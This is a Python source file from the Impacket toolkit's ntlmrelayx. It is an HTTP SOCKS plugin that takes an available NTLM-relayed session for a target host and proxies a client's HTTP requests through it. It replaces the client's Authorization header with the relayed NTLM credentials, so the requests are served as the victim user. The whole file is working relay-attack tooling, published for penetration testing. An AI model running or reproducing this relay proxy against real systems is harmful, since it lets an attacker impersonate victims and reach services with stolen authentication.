# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   Socks Proxy for the HTTP Protocol
#
#  A simple SOCKS server that proxies a connection to relayed HTTP connections
#
# Author:
#   Dirk-jan Mollema (@_dirkjan) / Fox-IT (https://www.fox-it.com)
#
from impacket import LOG
from impacket.examples.ntlmrelayx.servers.socksserver import SocksRelay

# Besides using this base class you need to define one global variable when
# writing a plugin:
PLUGIN_CLASS = "HTTPSocksRelay"
EOL = b'\r\n'

class HTTPSocksRelay(SocksRelay):
    PLUGIN_NAME = 'HTTP Socks Plugin'
    PLUGIN_SCHEME = 'HTTP'

    def __init__(self, targetHost, targetPort, socksSocket, activeRelays):
        SocksRelay.__init__(self, targetHost, targetPort, socksSocket, activeRelays)
        self.packetSize = 8192
        self.protocolClient = None

    @staticmethod
    def getProtocolPort():
        return 80

    def initConnection(self):
        pass

    # Keys in activeRelays that are metadata, not usernames
    RELAY_META_KEYS = frozenset(('data', 'scheme'))

    def findAvailableSession(self):
        """Auto-select the first available relay session for this target.

        activeRelays is keyed by username (DOMAIN/USER) plus metadata keys
        ('data', 'scheme'). We pick the first session that isn't inUse.
        """
        for key in self.activeRelays:
            if key in self.RELAY_META_KEYS:
                continue
            relay = self.activeRelays[key]
            if relay['inUse']:
                LOG.debug('HTTP: Session for %s@%s(%s) is in use, trying next' % (
                    key, self.targetHost, self.targetPort))
                continue
            return key, relay
        return None, None

    def skipAuthentication(self):
        # Receive the initial HTTP request from the SOCKS client (e.g. curl)
        data = self.recvFullRequest()
        if not data:
            return False

        # Auto-select an available relay session for this target
        self.username, relay = self.findAvailableSession()
        if self.username is None:
            LOG.error('HTTP: No available session for %s(%s)' % (
                self.targetHost, self.targetPort))
            reply = [b'HTTP/1.1 503 Service Unavailable', b'Connection: close', b'', b'']
            self.socksSocket.send(EOL.join(reply))
            return False

        LOG.info('HTTP: Proxying client session for %s@%s(%s)' % (
            self.username, self.targetHost, self.targetPort))
        self.protocolClient = relay['protocolClient']
        self.session = self.protocolClient.session

        # Proxy the initial request through the NTLM-authenticated relay session
        self.proxyRequest(data)
        return True

    def recvFullRequest(self):
        """Receive a complete HTTP request (headers + body) from the SOCKS client."""
        data = b''
        while True:
            chunk = self.socksSocket.recv(self.packetSize)
            if not chunk:
                return None
            data += chunk
            # Check if we have the full headers
            headerEnd = data.find(EOL + EOL)
            if headerEnd == -1:
                continue
            # Parse Content-Length to determine if we need more body data
            headers = self.getHeaders(data)
            try:
                contentLength = int(headers['content-length'])
            except (KeyError, ValueError):
                # No body expected (GET, HEAD, etc.) or chunked - return what we have
                break
            bodyStart = headerEnd + 4
            bodyReceived = len(data) - bodyStart
            if bodyReceived >= contentLength:
                break
        return data

    def parseRequest(self, data):
        """Parse raw HTTP request bytes into method, path, headers, and body."""
        headerEnd = data.find(EOL + EOL)
        if headerEnd == -1:
            headerEnd = len(data)
            body = b''
        else:
            body = data[headerEnd + 4:]

        lines = data[:headerEnd].split(EOL)
        requestLine = lines[0].decode('ascii')
        parts = requestLine.split(' ', 2)
        method = parts[0]
        path = parts[1] if len(parts) > 1 else '/'

        headers = {}
        for line in lines[1:]:
            decoded = line.decode('ascii')
            if ':' in decoded:
                key, val = decoded.split(':', 1)
                headers[key.strip()] = val.strip()

        return method, path, headers, body

    def proxyRequest(self, data):
        """Proxy a single HTTP request through the NTLM-authenticated relay session.

        Uses the HTTPConnection from the relay client's session, which already
        completed the NTLM handshake. All requests on this connection inherit
        the NTLM authentication transparently.
        """
        method, path, headers, body = self.parseRequest(data)

        # Strip headers that interfere with the relay connection
        proxyHeaders = {}
        for key, val in headers.items():
            lk = key.lower()
            # Remove client-side auth - we inject the relay's NTLM auth below
            if lk == 'authorization':
                continue
            # Keep the connection alive to preserve NTLM auth state
            if lk == 'connection' and val.lower() == 'close':
                proxyHeaders[key] = 'Keep-Alive'
                continue
            proxyHeaders[key] = val

        # Inject the NTLM auth header obtained from the successful relay
        if hasattr(self.protocolClient, 'ntlmAuthHeader') and self.protocolClient.ntlmAuthHeader:
            proxyHeaders['Authorization'] = self.protocolClient.ntlmAuthHeader

        # Forward the request through the authenticated HTTPConnection
        self.session.request(method, path, body=body if body else None, headers=proxyHeaders)
        res = self.session.getresponse()
        resBody = res.read()

        # Build and send the response back to the SOCKS client
        rawResponse = self.buildResponse(res, resBody)
        self.socksSocket.sendall(rawResponse)

    def buildResponse(self, res, body):
        """Reconstruct raw HTTP response bytes from an HTTPResponse and body.

        Since we read the full body (including chunked decoding), we normalize
        the response to use Content-Length for the client.
        """
        parts = []
        parts.append(('HTTP/1.1 %d %s' % (res.status, res.reason)).encode('ascii'))

        for hdr, val in res.getheaders():
            lh = hdr.lower()
            # Drop transfer-encoding and content-length; we set our own Content-Length
            if lh in ('transfer-encoding', 'content-length'):
                continue
            parts.append(('%s: %s' % (hdr, val)).encode('ascii'))

        parts.append(('Content-Length: %d' % len(body)).encode('ascii'))
        return EOL.join(parts) + EOL + EOL + body

    def getHeaders(self, data):
        """Parse HTTP headers into a lowercase-keyed dict."""
        headerSize = data.find(EOL + EOL)
        if headerSize == -1:
            headerSize = len(data)
        headers = data[:headerSize].split(EOL)[1:]
        headers = [header.decode('ascii') for header in headers]
        headerDict = {}
        for hdr in headers:
            if ':' in hdr:
                key, val = hdr.split(':', 1)
                headerDict[key.strip().lower()] = val.strip()
        return headerDict

    def tunnelConnection(self):
        """Handle subsequent requests after initial authentication.

        Each request from the SOCKS client is proxied through the
        NTLM-authenticated relay session.
        """
        while True:
            data = self.recvFullRequest()
            if not data:
                return
            self.proxyRequest(data)
